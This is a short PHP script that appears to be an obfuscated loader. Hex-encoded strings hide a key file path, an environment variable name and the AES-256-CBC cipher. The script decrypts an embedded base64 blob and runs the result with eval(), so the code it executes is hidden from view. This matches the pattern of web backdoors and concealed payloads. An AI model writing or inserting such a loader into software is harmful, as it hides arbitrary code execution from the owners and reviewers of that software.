<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('a1VUYZfpWl//XR9WwuI2/g==');

$c=base64_decode(

'xYtUo18uqvwkM1IiUCha15Ddz7+44pDWpW55EJNEAwOhbJckOuSIU+/42BQ7fBVQVKBeewql84EX' .
'26jI37QtnCFsb5xSybhEmSfIhT9DVlpBO9WNYvNeS2+vhHhk68Il0lIYJSP8L2GayNAqHUZJ5/o5' .
'OS1wXiBEW4Wz67cE9Do8vJy/h230g2N3aNNm98M0gmS9c+S+2Z+1sGNV9/Z561QBJ6BD1LB/DkCM' .
's7KYVwL04mgVzW718Lq2HdgKb8AJgU0Tg4NhtF8QquabBUX4gO+fxry+h+8J5cbl3xUQ8Q6ufWUC' .
'iIAfWrbR+Oli1Gi+M6PEYJgm+v3xBXmzl03AT2CZtM8i8+bA+CEmLWaJnUJgYchcb+fe9IcSQBsS' .
'6HLJz3dav1XYHpo5vUMXNWjdCXVyc3wJqg5I3/BRKlPSYkqkPzUKQw20nuFERUzqtDRQnLBLWku8' .
'8vIz5e9Zu0mUI3c4sbeoTFRxBKXQIW807IfXiGqbrm3k3zfXm+3QTa9Cq6HUt6KMtrHuDrpqEazl' .
'DFhXzSxMwjWN+zn0xrAegZnp808SkH3/jT3u++YyQQ+wx57/QmzdiiKREG7jcTFeo0LZEyDM4vkG' .
'7iUBqWDV8eIjyp2MnEyVqom9A1lQFDV7nMUkBtAN1jQ1KmSMFtQp+quZtxqFTWN33Sp/il3xCGuc' .
'kVxJc3chUxRBxo7bIUTRV5KgFujre1AjqGZYlwUnkw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

